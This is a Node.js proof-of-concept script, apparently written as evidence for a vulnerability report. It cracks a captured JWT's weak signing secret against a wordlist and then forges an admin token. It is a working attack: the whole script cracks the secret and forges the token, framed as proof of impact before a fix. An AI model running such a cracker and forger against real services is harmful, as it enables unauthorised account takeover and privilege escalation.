/**
 * Evidence script for "Vulnerability 1 - Hardcoded/weak JWT secret".
 *
 * Run this BEFORE fixing JWT_SECRET (while it is still the literal word "secret")
 * to prove the secret is guessable and a valid admin token can be forged.
 *
 * Usage: node security-evidence/jwt-weak-secret-demo.js
 */
const jwt = require("jsonwebtoken");

// A small sample wordlist. Swap this for rockyou.txt / a bigger list for the report.
const wordlist = ["123456", "password", "admin", "secret", "greenroot", "letmein"];

// Paste a real authToken cookie value captured from a logged-in session here.
const capturedToken = process.argv[2];

if (!capturedToken) {
    console.log("Usage: node jwt-weak-secret-demo.js <captured-authToken-value>");
    process.exit(1);
}

console.log("Attempting to crack JWT secret...\n");

for (const candidate of wordlist) {
    try {
        const payload = jwt.verify(capturedToken, candidate);
        console.log(`CRACKED! Secret is: "${candidate}"`);
        console.log("Decoded payload:", payload);

        // Prove impact: forge a brand-new token claiming to be an admin.
        const forgedToken = jwt.sign({ userId: "attacker-controlled-id", role: "admin" }, candidate, {
            expiresIn: "1d",
        });
        console.log("\nForged admin token (usable as authToken cookie / Bearer header):");
        console.log(forgedToken);
        process.exit(0);
    } catch (err) {
        // wrong candidate, keep trying
    }
}

console.log("Secret not found in wordlist — try a bigger list (e.g. rockyou.txt).");
